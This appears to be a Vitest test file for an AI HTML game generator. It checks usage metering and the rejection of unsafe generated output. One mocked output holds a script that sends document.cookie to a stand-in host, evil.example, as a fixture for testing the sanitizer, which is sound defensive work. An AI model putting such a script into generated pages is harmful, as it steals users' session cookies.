import { describe, expect, it } from 'vitest';
import { createTestContext, signUpAndGetCookie } from './helpers/test-harness.js';

describe('Neo AI Provider Adapter, HTML Safety Sanitization & Usage Metering', () => {
  it('generates valid sandboxed HTML and rolls back reserved usage when output is invalid or unsafe', async () => {
    const { app, neo } = await createTestContext();
    try {
      const creator = await signUpAndGetCookie(app, {
        email: 'neo_creator@doria.test',
        password: 'Password123!',
        name: 'Neo Creator',
      });

      const initialUsage = await app.inject({
        method: 'GET',
        url: '/api/ai/usage',
        headers: { cookie: creator.cookie },
      });
      expect(initialUsage.statusCode).toBe(200);
      expect(initialUsage.json().usage.promptsRemaining).toBe(10);

      const okGen = await app.inject({
        method: 'POST',
        url: '/api/neo/generate',
        headers: { cookie: creator.cookie },
        payload: {
          gameName: 'Star Collector',
          genre: 'Adventure',
          prompt: 'Collect falling stars before time runs out',
        },
      });
      expect(okGen.statusCode).toBe(200);
      expect(okGen.json().html).toContain('<body');
      expect(okGen.json().usage.promptsUsed).toBe(1);
      expect(okGen.json().usage.promptsRemaining).toBe(9);

      neo.nextResult = {
        text: '<!doctype html><html><body><script>fetch("https://evil.example/steal?c="+document.cookie)</script></body></html>',
      };
      const unsafeGen = await app.inject({
        method: 'POST',
        url: '/api/neo/generate',
        headers: { cookie: creator.cookie },
        payload: {
          gameName: 'Unsafe Test',
          genre: 'Puzzle',
          prompt: 'A game that tries to exfiltrate data',
        },
      });
      expect(unsafeGen.statusCode).toBe(502);

      const afterRollback = await app.inject({
        method: 'GET',
        url: '/api/ai/usage',
        headers: { cookie: creator.cookie },
      });
      expect(afterRollback.json().usage.promptsUsed).toBe(1);
      expect(afterRollback.json().usage.promptsRemaining).toBe(9);
    } finally {
      await app.close();
    }
  });
});
